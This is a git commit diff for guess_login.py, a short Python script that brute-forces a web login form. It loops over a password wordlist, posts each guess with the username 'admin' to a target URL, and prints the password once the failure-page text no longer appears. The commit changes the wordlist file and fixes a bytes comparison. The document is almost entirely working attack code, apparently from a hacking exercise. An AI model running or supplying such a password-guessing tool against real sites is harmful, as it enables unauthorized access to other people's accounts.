407d2338f03ccab4004017057c7e048de1ccea2f
Kelvin Forteta <53996412+kelvinforteta@users.noreply.github.com>
2024-05-27 19:13:04 -0400

    Update guess_login.py

--- guess_login.py
+++ guess_login.py
@@ -5,13 +5,13 @@ import requests
 target_url = ""
 data_dic = {"username": "admin", "password": "", "Login": "submit"}
 
-with open("subdomains.list", "r") as wordlist_file:
+with open("password.list", "r") as wordlist_file:
     for line in wordlist_file:
         word = line.strip()
         data_dic["password"] = word
         response = requests.post(target_url, data=data_dic)
 
-        if "[any_word_that is on failed page]" not in response.content:
+        if b"[any_word_that is on failed page]" not in response.content:
             print(f"[+] Got the password --> {word}")
             exit()
 print("[+] Reached end of line.")
